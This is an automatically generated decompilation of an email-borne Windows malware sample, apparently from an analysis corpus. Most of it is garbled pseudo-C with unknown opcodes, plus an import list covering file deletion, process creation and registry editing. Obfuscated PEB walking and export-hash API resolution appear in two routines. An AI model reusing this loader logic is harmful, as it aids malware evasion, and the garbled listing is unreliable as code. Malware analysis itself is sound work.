/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1343/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x0040101D - 0x00401057
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040101D()
{



    *(esi + 84) = *(esi + 84) + (ecx ^ 783965613);
    (restore)esi;
    asm("rol edx,0xe");
    esi = esi << 16;
    asm("ror eax,0x1b");
    esi = esi >> 16;
    ecx = ecx + *esp;
    esi = esi + 1179652;
    edx = edx + 1;
    ebp = *esi;
    ecx = ebx;
    si = si | 108;
    edi = esp;
    esi = !esi;
    do {
        edx = *edi;
        edi = edi + 1;
        eax = eax + 1356873262;
    } while(edx != ecx);
    return(eax - 1);
}

/*	Procedure: 0x00401058 - 0x00401069
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401058()
{



    *(esi + 7) = *(esi + 7) + ah;
    *(edi + 193003552) = *(edi + 193003552) + dl;
    *eax = *eax + al;
    ss = *edi;
    *eax = *eax + al;
    asm("sbb al,0x69");
}

/*	Procedure: 0x0040106A - 0x0040111A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040106A()
{



    *eax = *eax + al;
    *eax = *eax + al;
    asm("arpl bx,di");
    *eax = *eax + al;
    *eax = *eax ^ al;
    *(ecx + 16) = *(ecx + 16) + ch + bl;
    eax = eax + 1;
    *esi = *esi + bl;
    *eax = *eax + al;
    (save)3145736;
    *eax = *eax & al;
    (save)0;
    asm("adc [eax+0x0],al");
    if(!( *ecx = *ecx + cl)) {
    }
    edx = edx - 1;
    esp = esp + 1;
    *eax = *eax + al;
    eax = eax & -1526710256;
    *(eax + eax) = *(eax + eax) + cl;
    (restore)esi;
    asm("adc eax,0x150040");
    asm("das");
    eax = eax & *eax;
    if(!( *(eax + 34) = *(eax + 34) + bh)) {
        if(!( *eax = *eax + al)) {
            asm("ror byte [ecx+0xfc2c1de],0xbf");
        }
        *eax = *eax + al;
        cl = cl + eax + 1;
        asm("lock add [ecx+0x8000],edi");
        dx = dx + 50;
        asm("rep movsb");
        ecx = ecx ^ 4194304;
        edx = edx | -1771416531;
        *L00400000 = 5265997;
        eax = ~eax;
        esi = *L0040003C;
        edx = edx ^ -318140315;
        ecx = 0;
    }
    ecx = ecx + 17744;
    edi = edi + esi;
    eax = eax + ebp;
    *edi = ecx;
    ecx = !ecx;
    edi = edi - 1;
    (save) !LFFBFDFFF;
    esi = esi & 1821612981;
    eax = 0;
    asm("rol cx,0x2");
}

/*	Procedure: 0x0040111B - 0x0040112A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040111B()
{



    asm("rol edi,0x14");
    *eax = *eax + al;
    bl = bl | *(edx + -1962934272);
    asm("in al,dx");
    (save)ecx;
    (save)esi;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00401140 -> 0040116d */
/*	Procedure: 0x0040112B - 0x00401154
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    goto L00401148;
    *eax = *eax + al;
    asm("loope 0x40118d");
    *(ecx + 4938) = *(ecx + 4938) + bh;
    *eax = *eax + al;
    asm("%e stosd");
    asm("pusha");
    *eax = *eax + al;
    *eax = *eax + al;
    asm("jpe 0x40116d");
    *eax = *eax + al;
    asm("lahf");
    asm("sbb al,[eax]");
    asm("adc [ecx+0xd47c2ee2],eax");
L00401148:
    edi = !edi;
    eax = 83;
    ecx = ecx - 1;
}

stack space not deallocated on return
/*	Procedure: 0x004012C0 - 0x0040155D
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004012C0(A8)
/* unknown */ void  A8;
{



    asm("Unknown opcode 0x8f");
    asm("psraw mm7,[ecx]");
    > ? L004012c6 : ;
    if(!( *%ss:eax+eax-0x70] = *%ss:eax+eax-0x70] + dl)) {
    }
    bh = bh + bl;
    *eax = *eax + al;
    *ebp = *ebp + al;
    asm("ror esi,0x17");
    edx = edx & ecx;
    edi = A8;
    ecx = ecx ^ edx;
    esp = edi;
    asm("ror ax,0xe");
    (restore)ecx;
    asm("ror edx,0xf");
    eax = 0;
    esi = esi + *esp;
    *%fs:eax] = ecx;
    edi = ~edi;
    esp = esp + 4;
    ecx = ecx ^ -1151433599;
    eax = 48;
    asm("wait");
    esi = esi & -352748995;
    edi = ~edi;
    esi = *( *%fs:eax] + 12);
    asm("rol di,0x4");
    ecx = ecx | 1234442069;
    esi = esi + 28;
    eax = eax - esi;
    ecx = *esi;
    eax = *ecx;
    ecx = ecx - 419387118;
    edi = *(eax + 8);
    edx = ~L0000001C | 1459192566;
    asm("rol ecx,0x10");
    cx = cx - 95;
    (save)1214598188;
    eax = eax + esi;
    ebp = edi;
    si = si | 3;
    ecx = ecx & ebp;
    edx = 0x40109b;
    asm("ror ax,0x6");
    esi = *edx;
    (save)edi;
    ecx = ecx ^ -1256212987;
    eax = *esi() ^ -1952221906;
    (save)32960;
    dx = dx + 72;
    esi = !esi;
    (save)64;
    edx = edi;
    eax = eax + 64;
    eax = *edx();
    asm("cld");
    edi = eax;
    asm("cld");
    ebx = edi;
    asm("wait");
    eax = eax + 32779;
    *eax = ebp;
    eax = (eax & edx) + 1763159309;
    edx = edx - 1;
    ecx = *L0040109B;
    (save)-2048870963;
    asm("ror di,0xe");
    edx = ebp;
    eax = eax - ebp;
    (save)edx;
    di = di | 5;
    eax = *ecx() ^ 2101484637;
    esi = ebx;
    edx = edx | 1625052317;
    esi = esi - -32784;
    ecx = ~ecx;
    *esi = edi;
    eax = eax ^ 1033050125;
    (save)417363899;
    edi = edi + esi;
    (save)ebp;
    asm("Unknown opcode 0xc1");
    asm("int1");
    al = (al | *(ecx + 462863808)) + 190;
    asm("wait");
    asm("adc [eax+0x0],al");
    ecx = ecx - 1;
    edx = *esi;
    edi = edi >> 6;
    *edx();
    ecx = ecx - 1994370246;
    eax = ebx;
    asm("ror si,0x8");
    eax = eax - -32806;
    ecx = ecx - eax;
    edx = eax;
    esi = esi >> 10;
    *edx = edi;
    edx = edx - -1643670435;
    (save)928681518;
    edi = edi ^ 849868893;
    edi = edi | 797718237;
    eax = ~eax;
    ecx = ebp;
    eax = 0;
    (save)ecx;
    *( *L0040109B)();
    esi = esp;
    asm("cmc");
    (save)esi + -102;
    (save)64;
    esi = 4194304;
    ecx = 63;
    dx = dx | 123;
    ecx = *L0040003C + 4194304;
    asm("ror dx,0x5");
    ecx = ecx + 80;
    asm("rol edx,0x9");
    cx = cx | 116;
    *edi(esi, *ecx);
    eax = 1662194691;
    edi = edi + ebx;
    (save)1666384156;
    esi = esi ^ -1268655155;
    (restore)edx;
    ecx = ecx + 236771717;
    edx = edx ^ 1662194691;
    di = di + -13;
    esi = esi ^ 556752069;
    *edx = 1200621448;
    edi = edi + edi;
    ecx = -1566384163;
    ecx = 1662194691;
    esi = esi - 1;
    edx = 0x401525;
    asm("Unknown opcode 0xc1");
    asm("lock sbb al,0xbf");
    *eax = *eax + al;
    *eax = *eax + al;
    edi = edi ^ -493842288;
    esi = esi + ecx;
    *edx = edi;
    asm("rol ax,0x8");
    edi = edi + *esp;
    esi = 48;
    asm("rol dx,0x6");
    eax = eax ^ -1876118051;
    edx = edx + *esp;
    ecx = *%fs:esi] + 4;
    asm("clc");
    edx = *ecx;
    eax = eax + *esp;
    edx = edx + 1;
    eax = eax + 1;
    edx = edx + *L00401071;
    eax = 0;
    edi = 4202515 + edx;
    asm("cld");
    ecx = 796;
    eax = 0;
    asm("rol edx,0x6");
    esi = esi & 1850826309;
    al = *edi;
    edx = ~edx;
    si = si - -83;
    al = al ^ 110;
    asm("Unknown opcode 0xc1");
    asm("repne add bh,[esi+0x21c5f147]");
    *ebx & 45;
    esi = -146152815;
    asm("xlatb");
    asm("ror di,0x8");
    edx = 0x401071;
    asm("ror eax,0xe");
    esi = *edx;
    ecx = ecx ^ 1463234597;
    eax = eax + -902024163;
    esi = esi + 4202515;
    dx = dx + -81;
    (save)esi;
    di = edi - -52065874 + -11;
}

/* DEST BLOCK NOT FOUND: 0040163b -> f7ad0446 */
/*	Procedure: 0x0040155E - 0x0040163F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040155E(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    edx = edx >> 9;
    eax = A4;
    ecx = ecx ^ edx;
    edx = eax;
    asm("ror ecx,0x14");
    eax = eax + 34;
    esi = ~esi;
    eax = eax + 26;
    edi = edi & esi;
    ecx = *eax;
    esi = edx;
    esi = esi + 120;
    edi = !L00000078;
    ecx = *(esi + ecx) + 3 + 25;
    asm("stc");
    ecx = ecx + edx;
    asm("clc");
    esi = ecx;
    asm("wait");
    edi = *esi + edx;
    asm("cld");
    esi = esi - -4;
    ecx = *esi + edx;
    esi = esi - -4;
    asm("cld");
    eax = *esi;
    asm("cld");
    eax = eax + edx;
    asm("stc");
    (save)eax;
    (save)edi;
    (save)ecx;
    edx = A8;
    edi = ecx;
    asm("wait");
    (restore)ecx;
    ecx = 0;
    asm("cld");
    (save)ecx;
    eax = A4;
    asm("wait");
    (save)eax;
    asm("clc");
    (restore)esi;
    asm("wait");
    eax = eax + *edi;
    ecx = 0;
L004015cd:
    cl = cl + *eax;
    eax = eax + 1;
    asm("wait");
    asm("rol ecx,0x12");
    asm("clc");
    ecx = ecx ^ 1662194691;
    if(*eax != 0) {
        goto L004015cd;
    }
    asm("wait");
    if((ecx ^ edx) != 0) {
        (restore)ecx;
        (save)ecx + 1;
        edi = edi - -4;
        eax = *edi;
        asm("stc");
        eax = eax + esi;
        ecx = 0;
        asm("stc");
        goto L004015cd;
    }
    (restore)ecx;
    asm("wait");
    eax = Vfffffffc;
    asm("cmc");
    ecx = ecx << 1;
    asm("cmc");
    eax = eax + ecx;
    edx = ( *eax & 65535) << 2;
    (restore)eax;
    (save)eax;
    eax = eax + edx;
    (restore)ecx;
    edi = *eax;
    (restore)eax;
    ecx = ecx - 1;
    edi = edi + esi;
    asm("Unknown opcode 0xc1");
    asm("lock sbb [ecx+0x1],bl");
    asm("rol byte [ebx+0xe68108c4],cl");
    asm("lodsd");
    bl :: 0;
    eax = *LFAC1E1FF;
    asm("adc al,0x81");
    goto Lf7ad0446;
}

/* address  size  */
/* 0x0040112b       0 */ /* unknown */ void 	__entry_point__;
/* 0x00402000       0 */ /* unknown */ void 	__imp__InsertMenuA;
/* 0x00402004       0 */ /* unknown */ void 	__imp__GetCursor;
/* 0x00402008       0 */ /* unknown */ void 	__imp__LoadMenuA;
/* 0x0040200c       0 */ /* unknown */ void 	__imp__GetWindowTextLengthA;
/* 0x00402010       0 */ /* unknown */ void 	__imp__GetFocus;
/* 0x00402014       0 */ /* unknown */ void 	__imp__IsMenu;
/* 0x00402018       0 */ /* unknown */ void 	__imp__GetDlgItem;
/* 0x0040201c       0 */ /* unknown */ void 	__imp__IsWindow;
/* 0x00402020       0 */ /* unknown */ void 	__imp__AlignRects;
/* 0x00402024       0 */ /* unknown */ void 	__imp__GetDC;
/* 0x00402028       0 */ /* unknown */ void 	__imp__CopyImage;
/* 0x0040202c       0 */ /* unknown */ void 	__imp__DrawTextW;
/* 0x00402030       0 */ /* unknown */ void 	__imp__DialogBoxParamA;
/* 0x00402034       0 */ /* unknown */ void 	__imp__DrawIcon;
/* 0x00402038       0 */ /* unknown */ void 	__imp__LoadCursorA;
/* 0x0040203c       0 */ /* unknown */ void 	__imp__GetMenu;
/* 0x00402040       0 */ /* unknown */ void 	__imp__CloseWindow;
/* 0x00402044       0 */ /* unknown */ void 	__imp__CopyIcon;
/* 0x0040204c       0 */ /* unknown */ void 	__imp__FindFirstFileA;
/* 0x00402050       0 */ /* unknown */ void 	__imp__DeleteFileA;
/* 0x00402054       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x00402058       0 */ /* unknown */ void 	__imp__GetCPInfo;
/* 0x0040205c       0 */ /* unknown */ void 	__imp__DeleteFileW;
/* 0x00402060       0 */ /* unknown */ void 	__imp__CopyFileExW;
/* 0x00402064       0 */ /* unknown */ void 	__imp__CopyFileW;
/* 0x00402068       0 */ /* unknown */ void 	__imp__CreateProcessA;
/* 0x0040206c       0 */ /* unknown */ void 	__imp__OpenFile;
/* 0x00402070       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x00402074       0 */ /* unknown */ void 	__imp__GetStdHandle;
/* 0x00402078       0 */ /* unknown */ void 	__imp__CopyFileA;
/* 0x0040207c       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x00402080       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x00402084       0 */ /* unknown */ void 	__imp__ReadConsoleA;
/* 0x00402088       0 */ /* unknown */ void 	__imp__ExitThread;
/* 0x0040208c       0 */ /* unknown */ void 	__imp__CreateDirectoryA;
/* 0x00402090       0 */ /* unknown */ void 	__imp__GetFileSize;
/* 0x00402094       0 */ /* unknown */ void 	__imp__OpenFileMappingA;
/* 0x00402098       0 */ /* unknown */ void 	__imp__GetFileTime;
/* 0x0040209c       0 */ /* unknown */ void 	__imp__FindAtomA;
/* 0x004020a4       0 */ /* unknown */ void 	__imp__ImageList_GetDragImage;
/* 0x004020a8       0 */ /* unknown */ void 	__imp__ImageList_Merge;
/* 0x004020ac       0 */ /* unknown */ void 	__imp__ImageList_GetIconSize;
/* 0x004020b0       0 */ /* unknown */ void 	__imp__ImageList_DrawEx;
/* 0x004020b4       0 */ /* unknown */ void 	__imp__ImageList_Remove;
/* 0x004020b8       0 */ /* unknown */ void 	__imp__ImageList_Replace;
/* 0x004020bc       0 */ /* unknown */ void 	__imp__ImageList_GetImageCount;
/* 0x004020c0       0 */ /* unknown */ void 	__imp__ImageList_AddIcon;
/* 0x004020c4       0 */ /* unknown */ void 	__imp__ImageList_LoadImageA;
/* 0x004020c8       0 */ /* unknown */ void 	__imp__ImageList_Draw;
/* 0x004020cc       0 */ /* unknown */ void 	__imp__ImageList_DragEnter;
/* 0x004020d0       0 */ /* unknown */ void 	__imp__ImageList_ReplaceIcon;
/* 0x004020d4       0 */ /* unknown */ void 	__imp__ImageList_BeginDrag;
/* 0x004020d8       0 */ /* unknown */ void 	__imp__ImageList_DragLeave;
/* 0x004020dc       0 */ /* unknown */ void 	__imp__ImageList_Read;
/* 0x004020e0       0 */ /* unknown */ void 	__imp__ImageList_Create;
/* 0x004020e4       0 */ /* unknown */ void 	__imp__ImageList_GetImageInfo;
/* 0x004020e8       0 */ /* unknown */ void 	__imp__ImageList_DragShowNolock;
/* 0x004020ec       0 */ /* unknown */ void 	__imp__ImageList_LoadImage;
/* 0x004020f0       0 */ /* unknown */ void 	__imp__InitCommonControls;
/* 0x004020f4       0 */ /* unknown */ void 	__imp__ImageList_EndDrag;
/* 0x004020f8       0 */ /* unknown */ void 	__imp__ImageList_DragMove;
/* 0x00402100       0 */ /* unknown */ void 	__imp__RegQueryValueExW;
/* 0x00402104       0 */ /* unknown */ void 	__imp__RegQueryValueExA;
/* 0x00402108       0 */ /* unknown */ void 	__imp__RegOpenKeyA;
/* 0x0040210c       0 */ /* unknown */ void 	__imp__RegEnumKeyExA;
/* 0x00402110       0 */ /* unknown */ void 	__imp__RegOpenKeyExW;
/* 0x00402114       0 */ /* unknown */ void 	__imp__RegDeleteKeyA;
/* 0x00402118       0 */ /* unknown */ void 	__imp__RegEnumKeyW;
/* 0x0040211c       0 */ /* unknown */ void 	__imp__RegQueryInfoKeyA;
/* 0x00402120       0 */ /* unknown */ void 	__imp__RegDeleteValueA;
/* 0x00402124       0 */ /* unknown */ void 	__imp__RegCreateKeyW;
/* 0x00402128       0 */ /* unknown */ void 	__imp__RegLoadKeyW;
/* 0x0040212c       0 */ /* unknown */ void 	__imp__RegCreateKeyExW;
/* 0x00402130       0 */ /* unknown */ void 	__imp__RegEnumKeyA;
/* 0x00402134       0 */ /* unknown */ void 	__imp__RegLoadKeyA;
/* 0x00402138       0 */ /* unknown */ void 	__imp__RegQueryValueA;
/* 0x0040213c       0 */ /* unknown */ void 	__imp__RegGetKeySecurity;
/* 0x00402140       0 */ /* unknown */ void 	__imp__RegDeleteKeyW;
/* 0x00402144       0 */ /* unknown */ void 	__imp__RegEnumValueA;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
